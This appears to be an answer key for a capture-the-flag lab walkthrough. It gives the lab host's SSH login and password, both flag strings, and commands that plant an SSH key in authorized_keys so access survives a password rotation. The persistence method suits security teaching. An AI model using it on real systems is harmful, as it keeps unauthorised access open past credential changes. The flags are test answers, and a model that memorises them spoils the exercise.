# Lab 10 — CTF Walkthrough (Answer Key)

## Flag 1: user.txt

```bash
ssh lowpriv@10.10.10.10
# password: lowpriv123
cat user.txt
```

Flag: `flag{lab10_initial_foothold}`

## Flag 2: root.txt (after rotating credentials)

Plant an SSH key first:

```bash
ssh-keygen -t ed25519 -f /root/.ssh/lab10_key -N ""
cat /root/.ssh/lab10_key.pub | ssh lowpriv@10.10.10.10 "cat >> ~/.ssh/authorized_keys"
```

Rotate the password:

```bash
ssh -t -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "passwd"
```

Confirm access survives, using only the key:

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "cat root.txt"
```

Flag: `flag{lab10_persistence_survived_rotation}`

## Lesson

The flag is gated behind an action (rotating the password) rather than a technical lock, on purpose — the point of this lab isn't a puzzle, it's proving to yourself that the persistence mechanism you planted is genuinely independent of the access method it was planted through.
